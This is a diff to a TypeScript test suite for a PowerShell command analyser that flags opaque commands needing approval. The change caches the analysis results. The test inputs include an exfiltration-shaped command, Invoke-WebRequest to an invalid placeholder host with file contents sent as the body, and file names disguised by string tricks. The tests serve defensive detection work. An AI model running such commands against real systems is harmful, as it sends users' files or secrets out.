@@ -437,11 +437,17 @@ describe("opaque command text requires approval", () => {
       "(Convert-PathText 'notes.txt')",
       "(('notes','.txt') -join '')",
     ];
+    // The seeded sequence revisits ten exact commands; retain every assertion
+    // while doing the same immutable analysis only once per command.
+    const inspections = new Map(unsupported.flatMap((expression) => [
+      `Get-Content ${expression}`,
+      `iwr https://x.invalid -Body ${expression}`,
+    ]).map((command) => [command, powerShellFloorAnalysis.inspectPowerShellCommand(command, CWD)]));
     for (let index = 0; index < 80; index += 1) {
       seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
       const expression = unsupported[seed % unsupported.length]!;
       const command = seed & 1 ? `Get-Content ${expression}` : `iwr https://x.invalid -Body ${expression}`;
-      expect(powerShellFloorAnalysis.inspectPowerShellCommand(command, CWD), command).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
+      expect(inspections.get(command), command).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
     }
     expect(powerShellExfiltrationSignal(benign, CWD)).toBeNull();
   });
@@ -462,13 +468,16 @@ describe("opaque command text requires approval", () => {
       ["format", "Get-Content ('notes{0}' -f '.txt')"],
       ["join-path", "Get-Content (Join-Path 'docs' 'notes.txt')"],
     ] as const;
+    const inspections = new Map(cases.map(([kind, command]) => [kind, {
+      supported: powerShellFloorAnalysis._inspectPowerShellForTest(command, CWD),
+      unsupported: powerShellFloorAnalysis._inspectPowerShellForTest(command, CWD, [kind]),
+    }]));
     let seed = 0x178d;
     const exercised = new Set<string>();
     for (let index = 0; index < 70; index += 1) {
       seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
       const [kind, command] = cases[seed % cases.length]!;
-      const supported = powerShellFloorAnalysis._inspectPowerShellForTest(command, CWD);
-      const unsupported = powerShellFloorAnalysis._inspectPowerShellForTest(command, CWD, [kind]);
+      const { supported, unsupported } = inspections.get(kind)!;
       expect(supported.exfiltration, command).toBeNull();
       expect(unsupported, `${kind}: ${command}`).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
       exercised.add(kind);
